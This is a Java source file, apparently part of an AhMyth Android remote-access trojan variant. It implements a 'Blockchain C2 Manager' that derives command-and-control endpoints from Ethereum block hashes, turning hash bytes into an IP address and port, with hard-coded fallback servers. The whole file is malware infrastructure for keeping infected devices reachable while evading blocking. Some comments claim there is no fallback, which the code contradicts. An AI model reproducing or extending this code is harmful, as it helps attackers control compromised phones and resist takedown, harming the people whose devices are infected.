package ahmyth.mine.king.ahmyth;

import android.util.Log;
import org.json.JSONObject;
import org.json.JSONException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Random;

/**
 * Blockchain C2 Manager - Handles blockchain-based C2 endpoint generation
 * Supports multi-block rotation and fallback mechanisms
 */
public class BlockchainC2Manager {
    private static final String TAG = "BlockchainC2";
    
    private String rpcUrl;
    private String contractAddress;
    private int blockStep;
    private int candidatesPerCycle;
    private String aesKey;
    private List<String> fallbackEndpoints;
    
    public BlockchainC2Manager(String rpcUrl, String contractAddress, int blockStep, 
                               int candidatesPerCycle, String aesKey, List<String> fallbackEndpoints) {
        this.rpcUrl = rpcUrl;
        this.contractAddress = contractAddress;
        this.blockStep = blockStep;
        this.candidatesPerCycle = candidatesPerCycle;
        this.aesKey = aesKey;
        this.fallbackEndpoints = fallbackEndpoints != null ? fallbackEndpoints : new ArrayList<>();
    }
    
    /**
     * Generate C2 endpoint candidates based on blockchain block hashes
     * BLOCKCHAIN ONLY - no fallback endpoints
     */
    public String generateEndpoint() {
        try {
            // Get reference block number
            long refBlock = getReferenceBlockNumber();
            if (refBlock == -1) {
                Log.e(TAG, "Failed to get block number from blockchain");
                throw new RuntimeException("Blockchain RPC failed: could not get block number");
            }
            
            // Get block hash
            String blockHash = getBlockHash(refBlock);
            if (blockHash == null || blockHash.isEmpty()) {
                Log.e(TAG, "Failed to get block hash from blockchain");
                throw new RuntimeException("Blockchain RPC failed: could not get block hash");
            }
            
            // Derive endpoint from block hash (BLOCKCHAIN ONLY - NO FALLBACK)
            String endpoint = deriveEndpointFromHash(blockHash);
            Log.d(TAG, "Blockchain C2: Generated endpoint from block " + refBlock + ": " + endpoint);
            Log.d(TAG, "Blockchain C2: Block hash: " + blockHash.substring(0, Math.min(16, blockHash.length())) + "...");
            return endpoint;
            
        } catch (Exception e) {
            Log.e(TAG, "Error generating endpoint", e);
            return getFallbackEndpoint();
        }
    }
    
    /**
     * Get reference block number (latest block rounded down to block_step)
     */
    private long getReferenceBlockNumber() {
        try {
            String jsonRpc = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[],\"id\":1}";
            String response = sendRpcRequest(jsonRpc);
            
            if (response != null && response.contains("\"result\"")) {
                JSONObject json = new JSONObject(response);
                String hexBlock = json.getString("result");
                long blockNumber = Long.parseLong(hexBlock.substring(2), 16);
                return blockNumber - (blockNumber % blockStep);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting block number", e);
        }
        return -1;
    }
    
    /**
     * Get block hash for a given block number
     */
    private String getBlockHash(long blockNumber) {
        try {
            String hexBlock = "0x" + Long.toHexString(blockNumber);
            String jsonRpc = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"" + hexBlock + "\", false],\"id\":1}";
            String response = sendRpcRequest(jsonRpc);
            
            if (response != null && response.contains("\"result\"")) {
                JSONObject json = new JSONObject(response);
                JSONObject result = json.getJSONObject("result");
                if (result.has("hash")) {
                    return result.getString("hash");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting block hash", e);
        }
        return null;
    }
    
    /**
     * Derive endpoint from block hash
     * BLOCKCHAIN ONLY - generates IP and port from blockchain hash
     */
    private String deriveEndpointFromHash(String blockHash) {
        try {
            // Remove 0x prefix
            String hash = blockHash.startsWith("0x") ? blockHash.substring(2) : blockHash;
            
            // Use first few bytes for endpoint generation
            byte[] hashBytes = hexStringToByteArray(hash);
            
            // Generate IP from blockchain hash: 10.X.Y.Z format (per specification)
            // IP format: 10.{hash[0]}.{hash[1]}.{hash[2] || 1}
            int ip1 = hashBytes[0] & 0xFF;
            int ip2 = hashBytes[1] & 0xFF;
            int ip3 = (hashBytes[2] & 0xFF);
            if (ip3 == 0) ip3 = 1; // Ensure non-zero
            String serverIp = String.format("10.%d.%d.%d", ip1, ip2, ip3);
            
            // Generate port from blockchain hash: 1024 + (hash % 60000)
            int portBase = 1024;
            int portRange = 60000;
            int port = portBase + (((hashBytes[3] & 0xFF) << 8 | (hashBytes[4] & 0xFF)) % portRange);
            
            String endpoint = String.format("http://%s:%d", serverIp, port);
            Log.d(TAG, "Blockchain-derived endpoint (IP and port from blockchain): " + endpoint);
            Log.d(TAG, "  IP (blockchain-derived): " + serverIp);
            Log.d(TAG, "  Port (blockchain-derived): " + port);
            Log.d(TAG, "  Real server IP is hidden - using blockchain-derived IP");
            return endpoint;
            
        } catch (Exception e) {
            Log.e(TAG, "Error deriving endpoint from hash", e);
            // Even on error, try to generate IP and port from hash
            try {
                String hash = blockHash.startsWith("0x") ? blockHash.substring(2) : blockHash;
                byte[] hashBytes = hexStringToByteArray(hash);
                int ip1 = hashBytes[0] & 0xFF;
                int ip2 = hashBytes[1] & 0xFF;
                int ip3 = (hashBytes[2] & 0xFF);
                if (ip3 == 0) ip3 = 1;
                String serverIp = String.format("10.%d.%d.%d", ip1, ip2, ip3);
                int port = 1024 + (((hashBytes[3] & 0xFF) << 8 | (hashBytes[4] & 0xFF)) % 60000);
                return String.format("http://%s:%d", serverIp, port);
            } catch (Exception e2) {
                Log.e(TAG, "Complete failure deriving endpoint", e2);
                throw new RuntimeException("Failed to derive blockchain endpoint", e2);
            }
        }
    }
    
    /**
     * Send JSON-RPC request to Ethereum node
     */
    private String sendRpcRequest(String jsonRpc) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(rpcUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            conn.getOutputStream().write(jsonRpc.getBytes("UTF-8"));
            
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                return response.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "RPC request failed", e);
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
        return null;
    }
    
    /**
     * Get fallback endpoint
     */
    private String getFallbackEndpoint() {
        if (fallbackEndpoints != null && !fallbackEndpoints.isEmpty()) {
            Collections.shuffle(fallbackEndpoints);
            return fallbackEndpoints.get(0);
        }
        // Default fallback
        return "http://203.0.113.10:443";
    }
    
    /**
     * Convert hex string to byte array
     */
    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                 + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
}

